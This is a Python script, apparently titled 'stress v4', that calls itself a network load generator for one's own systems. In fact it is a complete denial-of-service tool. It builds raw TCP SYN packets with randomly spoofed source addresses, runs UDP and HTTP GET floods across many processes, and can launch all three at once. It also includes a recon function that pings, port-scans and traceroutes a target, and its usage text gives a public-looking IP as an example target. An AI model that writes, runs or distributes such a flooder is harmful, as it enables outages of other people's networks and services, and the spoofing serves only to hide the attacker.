#!/usr/bin/env python3
"""stress v4 — high-throughput network load generator. Own systems only."""

import sys, os, time, socket, struct, random, multiprocessing, threading, queue
from datetime import datetime
from subprocess import run, PIPE

VERSION = "v4.0"
BANNER = f"""
  stress {VERSION} — network load generator
  only hit systems you own or have written permission to test
"""


def log(msg):
    print(f"  [{datetime.now().strftime('%H:%M:%S')}] {msg}")


# ---------------------------------------------------------------------------
# Packet factory — pre-builds raw SYN packets into a shared buffer
# ---------------------------------------------------------------------------
class SynFactory:
    """Thread-safe pre-built SYN packet buffer."""

    def __init__(self, target: str, batch: int = 1024):
        self.target = target
        self.dip = socket.inet_aton(target)
        self.batch = batch
        self._buf = []
        self._lock = threading.Lock()
        self._refill()

    def _cksum(self, data: bytes) -> int:
        if len(data) % 2:
            data += b"\x00"
        s = sum(struct.unpack(f"!{len(data) // 2}H", data))
        s = (s >> 16) + (s & 0xFFFF)
        return (~s) & 0xFFFF

    def _build_one(self) -> bytes:
        saddr = socket.inet_aton(
            f"{random.randrange(1, 255)}.{random.randrange(1, 255)}."
            f"{random.randrange(1, 255)}.{random.randrange(1, 255)}"
        )
        sport = random.randrange(1024, 65535)
        dport = random.choice([80, 443, 8080, 22, 53, 8443, 3389])
        seq = random.randrange(0, 0xFFFFFFFF)
        ip_id = random.randrange(0, 0xFFFF)

        ip = struct.pack("!BBHHHBBIH", 0x45, 0, 40, ip_id, 0x4000, 64, 6, 0)
        ip += saddr + self.dip
        ck = self._cksum(ip)
        ip = struct.pack("!BBHHHBBIH", 0x45, 0, 40, ip_id, 0x4000, 64, 6, ck)
        ip += saddr + self.dip

        tcp = struct.pack("!HHIIBBHHH", sport, dport, seq, 0, 0x50, 0x02, 65535, 0, 0)
        psh = struct.pack("!4s4sBBH", saddr, self.dip, 0, 6, 20)
        tcp_ck = self._cksum(psh + tcp)
        tcp = struct.pack(
            "!HHIIBBHHH", sport, dport, seq, 0, 0x50, 0x02, 65535, tcp_ck, 0
        )
        return ip + tcp

    def _refill(self):
        with self._lock:
            self._buf = [self._build_one() for _ in range(self.batch)]

    def get(self) -> bytes:
        with self._lock:
            if not self._buf:
                self._refill()
            return self._buf.pop()


# ---------------------------------------------------------------------------
# Worker processes
# ---------------------------------------------------------------------------
def _syn_worker(target: str, dur: float, wid: int, q: multiprocessing.Queue):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        q.put(("err", wid, "root required — run with sudo"))
        return

    factory = SynFactory(target, batch=4096)
    end = time.time() + dur
    cnt = 0
    last_report = time.time()

    while time.time() < end:
        try:
            sock.sendto(factory.get(), (target, 0))
            cnt += 1
        except OSError:
            continue
        now = time.time()
        if now - last_report >= 2:
            q.put(("p", wid, cnt))
            last_report = now

    q.put(("d", wid, cnt))
    sock.close()


def _udp_worker(target: str, dur: float, wid: int, q: multiprocessing.Queue):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except OSError as e:
        q.put(("err", wid, str(e)))
        return

    payloads = [os.urandom(s) for s in (64, 256, 512, 1024, 1400)]
    ports = [53, 80, 123, 161, 443, 5000, 8080, 5353]
    end = time.time() + dur
    cnt = 0
    last_report = time.time()

    while time.time() < end:
        try:
            sock.sendto(random.choice(payloads), (target, random.choice(ports)))
            cnt += 1
        except OSError:
            continue
        now = time.time()
        if now - last_report >= 2:
            q.put(("p", wid, cnt))
            last_report = now

    q.put(("d", wid, cnt))
    sock.close()


def _http_worker(target: str, dur: float, wid: int, q: multiprocessing.Queue):
    req = (
        f"GET / HTTP/1.1\r\nHost: {target}\r\n"
        f"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\r\n"
        f"Accept: */*\r\nConnection: keep-alive\r\n\r\n"
    ).encode()
    end = time.time() + dur
    cnt = 0
    last_report = time.time()

    while time.time() < end:
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((target, 80))
            s.sendall(req)
            s.recv(256)
            s.close()
            cnt += 1
        except (socket.timeout, ConnectionRefusedError, OSError):
            continue
        now = time.time()
        if now - last_report >= 2:
            q.put(("p", wid, cnt))
            last_report = now

    q.put(("d", wid, cnt))


# ---------------------------------------------------------------------------
# Orchestrator
# ---------------------------------------------------------------------------
def _run_workers(
    target: str,
    dur: int,
    worker_fn,
    label: str,
    min_workers: int = 2,
    threads_per: int = 1,
):
    cores = os.cpu_count() or 4
    n_workers = max(min_workers, cores * threads_per)
    log(f"launching {n_workers} {label} workers on {target} for {dur}s")

    q = multiprocessing.Queue()
    procs = [
        multiprocessing.Process(target=worker_fn, args=(target, dur, i, q))
        for i in range(n_workers)
    ]
    for p in procs:
        p.start()

    start = time.time()
    totals = [0] * n_workers
    errors = []
    last_total = 0
    last_report = time.time()

    while any(p.is_alive() for p in procs):
        try:
            msg = q.get(timeout=0.3)
            kind = msg[0]
            wid = msg[1]
            val = msg[2]
            if kind in ("p", "d"):
                totals[wid] = val
            elif kind == "err":
                errors.append(val)
        except (queue.Empty, ValueError, IndexError):
            pass

        elapsed = time.time() - start
        if elapsed - (time.time() - last_report) >= 1:
            total = sum(totals)
            rate = (total - last_total) / max(
                elapsed - (time.time() - last_report), 0.1
            )
            print(
                f"  {datetime.now().strftime('%H:%M:%S')}  {total:>10} pkts  {rate:>7.0f}/s",
                end="\r",
            )
            last_total = total
            last_report = time.time()

    for p in procs:
        p.join()

    total = sum(totals)
    elapsed = time.time() - start
    avg = total / max(elapsed, 0.1)
    log(f"done — {total:,} packets in {elapsed:.1f}s ({avg:,.0f}/s)")
    if errors:
        log(f"errors: {'; '.join(set(errors))}")


# ---------------------------------------------------------------------------
# Public methods
# ---------------------------------------------------------------------------
def syn_flood(target: str, dur: int, workers: int = 0):
    _run_workers(
        target, dur, _syn_worker, "syn", min_workers=max(2, os.cpu_count() or 2)
    )


def udp_flood(target: str, dur: int, workers: int = 0):
    _run_workers(
        target, dur, _udp_worker, "udp", min_workers=max(2, (os.cpu_count() or 4) // 2)
    )


def http_flood(target: str, dur: int, workers: int = 0):
    _run_workers(
        target, dur, _http_worker, "http", min_workers=max(4, os.cpu_count() or 4)
    )


def all_at_once(target: str, dur: int = 30):
    log("launching syn + udp + http simultaneously")
    cpus = os.cpu_count() or 4
    sub = max(2, cpus // 2)
    procs = [
        multiprocessing.Process(
            target=_run_workers, args=(target, dur, _syn_worker, "syn", sub)
        ),
        multiprocessing.Process(
            target=_run_workers, args=(target, dur, _udp_worker, "udp", 2)
        ),
        multiprocessing.Process(
            target=_run_workers, args=(target, dur, _http_worker, "http", 4)
        ),
    ]
    for p in procs:
        p.start()
    for p in procs:
        p.join()
    log("all attacks finished")


def verify(target: str):
    log(f"probing {target}...\n")
    r = run(["ping", "-c2", "-W2", target], capture_output=True)
    alive = r.returncode == 0
    print(f"    icmp:    {'alive' if alive else 'no response'}")

    for port in (80, 443, 22, 8080, 8443, 53, 3389):
        try:
            s = socket.socket()
            s.settimeout(2)
            s.connect((target, port))
            print(f"    port {port}: open")
            s.close()
        except (socket.timeout, ConnectionRefusedError, OSError):
            pass

    # Traceroute hop count
    r = run(["traceroute", "-n", "-q1", "-w1", target], capture_output=True, text=True)
    hops = [l for l in r.stdout.split("\n") if l.strip() and "*" not in l.split()[1:2]]
    print(f"    hops:    {len(hops)}")
    print(f"    gateway: {hops[0].split()[1] if len(hops) > 1 else 'unknown'}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    print(BANNER)
    if len(sys.argv) < 2 or sys.argv[1] in ("-h", "--help"):
        print("  usage: python3 stress.py <target> <method> [duration]")
        print("  methods:  syn      TCP SYN flood (fast, needs root)")
        print("            udp      UDP packet flood (no root)")
        print("            http     HTTP GET flood")
        print("            all      syn + udp + http simultaneously")
        print("            verify   probe target (icmp + ports + hops)")
        print("  examples:")
        print("    sudo python3 stress.py 2.121.59.67 syn 30")
        print("    python3 stress.py example.com http 60")
        print("    python3 stress.py 192.168.0.1 verify")
        sys.exit(0)

    target = sys.argv[1]
    method = sys.argv[2].lower() if len(sys.argv) > 2 else "verify"
    dur = int(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3].isdigit() else 30
    workers = int(sys.argv[4]) if len(sys.argv) > 4 and sys.argv[4].isdigit() else 0

    print(f"  target:   {target}")
    print(f"  method:   {method}")
    print(f"  duration: {dur if method != 'verify' else 'n/a'}s")
    print()

    table = {
        "syn": lambda: syn_flood(target, dur, workers),
        "udp": lambda: udp_flood(target, dur, workers),
        "http": lambda: http_flood(target, dur, workers),
        "all": lambda: all_at_once(target, dur),
        "verify": lambda: verify(target),
    }

    fn = table.get(method)
    if not fn:
        print(f"  unknown method: {method}")
        print(f"  available: {', '.join(table.keys())}")
        sys.exit(1)
    fn()
    print()
